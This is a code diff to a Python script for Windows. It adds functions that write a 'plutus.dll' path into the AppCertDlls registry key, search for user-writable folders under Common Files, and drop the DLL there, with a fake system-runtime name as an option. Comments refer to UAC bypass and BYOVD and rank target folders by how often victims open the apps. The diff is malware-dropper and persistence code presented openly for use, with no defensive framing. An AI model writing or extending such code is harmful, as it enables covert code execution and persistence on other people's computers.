@@ -2,10 +2,13 @@ import subprocess
 import ctypes
 import sys
 import os
+import winreg
+from typing import List
 import requests
 import glob
 from ctypes import wintypes
 from typing import Final, Callable
+# import os.path as Path
 
 # --------------------------------------------------------------------------- #
 # Platform Detection & Constants
@@ -232,9 +235,86 @@ def setup_environment():
     # print(f"Return code: {process.returncode}")
 
 
+def inject_appcertdlls(paths: List[str]) -> bool:
+    """
+    Actually writes to HKLM\...\AppCertDlls (requires SeDebugPrivilege or admin in most cases,
+    but on many BYOVD/UAC-bypass scenarios you already have the needed rights).
+    """
+    value_data = " ".join(paths) + "plutus.dll"
+    key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls"
 
-def mv_dll():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
+        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, value_data)   # default value = the paths
+        winreg.CloseKey(key)
+        print(f"[+] AppCertDlls injected ({len(paths)} path(s)) → {value_data}")
+        return True
+    except PermissionError:
+        print("[-] Failed: No privileges to write to AppCertDlls (expected if not elevated yet)")
+        print("    → This is normal. The DLLs are already on disk — trigger any CreateProcessWithLogonW /"
+              "RunAs / cmstp / eventvwr etc. and it will load.")
+        return False
+    except Exception as e:
+        print(f"[-] Unexpected error writing AppCertDlls: {e}")
+        return False
+
+def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dll"):
+    """
+    Drop plutus.dll into a user-writable WindowsApps folder (no admin, no takeown/icacls)
+    Prioritized targets = folders that are naturally writable by normal users in 2025
+    """
     with open("plutus.dll", "rb") as f:
         data = f.read()
-    print (f"Size of plutus.dll: {len(data)}")
-    
+    # Top-tier folders that are almost always writable by standard users (2024–2025)
+    # priority_folders = [
+    #     # 1. Windows Photos (2025 version) – opened daily
+    #     "Microsoft.Windows.Photos_2025.*",
+    #     "Microsoft.Windows.Photos_2024.*",
+        
+    #     # 2. Snipping Tool / ScreenSketch – used constantly
+    #     "Microsoft.ScreenSketch_*",
+        
+    #     # 3. Clock / Alarms – auto-starts for many users
+    #     "Microsoft.WindowsAlarms_*",
+        
+    #     # 4. Shared runtime – loaded by 20+ apps
+    #     "Microsoft.WindowsAppRuntime.1.8_*",
+    #     "Microsoft.WindowsAppRuntime.1.7_*",
+        
+    #     # 5. Skype (still preinstalled on many images)
+    #     "Microsoft.SkypeApp_*",
+    # ]
+
+    windowsapps = glob.glob("C:/Program Files/Common Files/**/**/**/")
+    if not windowsapps:
+        print("[-] WindowsApps folder not found")
+        return False
+
+    target_dir = None
+    # for pattern in priority_folders:
+    for folder in windowsapps:
+        try:
+            test_file = open(f"{folder}.write_test.tmp", "wb")
+            test_file.write(b"test")
+            test_file.close()
+            target_dir = folder
+            print(f"[+] Found writable folder: {folder}")
+            inject_appcertdlls([folder])
+
+            break
+        except (PermissionError, OSError):
+            continue
+        # if target_dir:
+            # break
+
+    if not target_dir:
+        print("[-] No writable WindowsApps folder found")
+        return False
+
+    try:
+        location = f"{folder}/plutus.dll"
+        dll = open(location, "wb").write(data)
+        return True
+    except Exception as e:
+        print(f"[-] Failed to copy: {e}")
+        return False
